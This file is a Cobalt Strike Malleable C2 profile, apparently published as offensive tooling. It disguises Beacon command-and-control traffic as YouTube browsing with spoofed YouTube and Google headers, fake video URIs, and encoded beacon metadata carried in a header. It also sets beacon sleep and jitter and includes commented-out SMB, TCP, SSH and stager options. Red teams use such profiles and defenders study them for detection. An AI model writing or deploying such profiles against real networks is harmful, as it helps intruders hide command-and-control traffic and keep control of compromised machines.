# YouTube video profile
# 
# Author: @ChickySticky
#

set sleeptime "1000";
set jitter    "42";
#set dns_idle "8.8.8.8";
#set maxdns    "245";
set useragent "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko";
#set post-ex.spawnto_x86 "userinit.exe";
#set post-ex.spawnto_x64 "userinit.exe";


###SMB Options###
##set pipename "ntsvcs##";
##set pipename_stager "scerpc##";
##set smb_frame_header "";

###TCP Options###
##set tcp_port "8000";
##set tcp_frame_header "";

###SSH options###
##set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
##set ssh_pipename "SearchTextHarvester##";

#custom cert
#https-certificate {
#    set keystore "your_store_file.store";
#    set password "your_store_pass";


################################################
## HTTP GET
################################################
## Description:
##    GET is used to poll teamserver for tasks
## Defaults:
##    uri "/activity"
##    Headers (Sample)
##      Accept: */*
##      Cookie: AGXVzq9TsOsr5VxnvrV6tp54aH8DIH6RG3ssV5tEuSSsrRMU6RDkZwH20OmQRPHIqAFZFfbDeXppcUfcI5jeYvPVd1VRFhaiTDKGR6OqNSW4qX3MfYVIzsalHKCgVV_4G9AojAqSx_pRKqA4S7dUvvc
##      User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1)
## Guidelines:
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Analyze sample HTTP traffic to use as a reference
##    - Multiple URIs can be added. Beacon will randomly pick from these.
##      - Use spaces as a URI seperator

http-get {

    set uri "/watch?v=ARf7LKo-hnk /watch?v=MfxuiQj9IbE&t=1010s /watch?v=dV3XX4eRHfU /watch?v=Y4M8mmy1wrU /watch?v=ebT-4Rea4jQ"; 

    client {

        header "Accept" "*/*";
        header "Accept" "*=*";
        header "Accept" "*?*";
        header "Host" "www.youtube.com";
        header "Referer" "http://gds.google.com/";
        header "Accept-Encoding" "gzip, deflate";


        metadata {
            base64url;
            prepend "__cfduid=";
            header  "AGXVzq9TsOsr5VxnvrV6tp54aH8DIH6RG3ssV5tEuSSsrRMU6RDkZwH20OmQRPHIqAFZFfbDeXppcUfcI5jeYvPVd1VRFhaiTDKGR6OqNSW4qX3MfYVIzsalHKCgVV_4G9AojAqSx_pRKqA4S7dUvvc";
        }
    }

    server {

        header "Server" "Mozilla/5.0";
        header "X-Frame-Options" "SAMEORIGIN";
        header "X-XSS Protection" "1; mode=block; report=https://www.google.com/appserve/security-bugs/log/youtube";
        header "Content-Encoding" "gzip";
        header "X-Content-Type-Options:" "nosniff";

        output {
            print;
        }
    }
}

http-post {
    
    set uri "/watch?v=gG-sK9zu6S8&t=8s /watch?v=rH3SCcU3SsM&t=683s /watch?v=FLbWd9uDv6k&t=634s /watch?v=J5dBMKwoEVE /watch?v=rLsrUd-gjx4";
    set verb "POST";

    client {

        header "Accept" "*/*";
        header "Accept" "*=*";
        header "Accept" "*?*";
        header "Content-Type" "text/html,application";
        header "X-Requested-With" "XMLHttpRequest";
        header "Host" "www.youtube.com";
        header "Accept-Language" "en-US,en;q=0.5";

        parameter "sz" "160x600";
        parameter "oe" "oe=ISO-8859-1;";

        id {
            parameter "sn";
        }

        parameter "s" "3717";
        parameter "dc_ref" "http%3A%2F%2Fwww.youtube.com";

        output {
            base64url;
            print;
        }
    }

    server {

        header "Strict-Transport-Security" "max-age=31536000";
        header "X-XSS-Protection" "1; mode=block; report=https://www.google.com/appserve/security-bugs/log/youtube";
        header "Content-Length" "0";
        header "Cache-Control" "no-cache";
        header "Expires" "Tue, 27 Apr 1969 19:44:06 EST";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Content-Type" "video/x-flv";
        header "X-Content-Type-Options" "nosniff";
        header "Server" "YouTube Frontend Proxy";
        header "Alt-Svc" "quic=':443'; ma=2592000; v='41,39,38,37,35'";
        header "Connection" "close";

        output {
            netbios;
            print;
        }
    }
}

#http-stager {

    #set uri_x86 "/youtubei/v1/";
    #set uri_x64 "/youtubei/V1/";


    #client {

        #header "Accept" "*/*";
        #header "Accept" "*=*";
        #header "Accept" "*?*";
        #header "Accept-Language" "en-US,en;q=0.5";
        #header "X-Goog-Visitor-Id" "CgtGbFYxTWlKTU96VQ==";
        #header "X-YouTube-Client-Name" "56";
        #header "X-YouTube-Client-Version" "20171026";
        #header "Connection" "close";
    #}

    #server {
        #header "Cache-Control" "no-cache";
        #header "Content-Type" "text/xml; charset=UTF-8";
        #header "X-Frame-Options" "SAMEORIGIN";
        #header "X-Content-Type-Options" "nosniff";
        #header "Strict-Transport-Security" "max-age=31536000";
        #header "Content-Length" "155";
        #header "Expires" "Tue, 27 Apr 1969 19:44:06 EST";
        #header "Date" "Fri, 27 Oct 2017 18:24:28 GMT";
        #header "Server" "YouTube Frontend Proxy";
        #header "X-XSS-Protection" "1; mode=block";
        #header "Alt-Svc" "quic=':443'; ma=2592000; v='41,39,38,37,35'";
        #header "Connection" "close";

    #output {
        #print;
        #}
    #}

#}
 

